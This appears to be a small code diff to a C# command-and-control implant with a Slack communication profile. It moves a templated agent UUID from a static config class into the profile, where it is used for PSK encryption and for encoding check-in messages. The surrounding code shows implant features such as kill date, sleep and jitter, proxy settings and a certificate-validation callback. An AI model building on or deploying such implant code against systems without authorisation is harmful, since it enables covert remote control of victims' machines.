@@ -16,15 +16,12 @@ namespace Athena
     public class Config : IConfig
     {
         public IProfile profile { get; set; }
-        public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
 
         public Config()
         {
-
-            uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
@@ -38,6 +35,7 @@ namespace Athena
 
     public class Slack : IProfile
     {
+        public string uuid { get; set; }
         public bool encrypted { get; set; }
         public PSKCrypto crypt { get; set; }
         public string psk { get; set; }
@@ -66,7 +64,7 @@ namespace Athena
             this.proxyHost = "proxy_host:proxy_port";
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
-
+            this.uuid = "%UUID%";
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
                    new RemoteCertificateValidationCallback(
@@ -76,7 +74,7 @@ namespace Athena
 
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(Config.uuid, this.psk);
+                this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
 
@@ -130,7 +128,7 @@ namespace Athena
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(Config.uuid + json);
+                    json = await Misc.Base64Encode(this.uuid + json);
                 }
 
                 int i = 0;
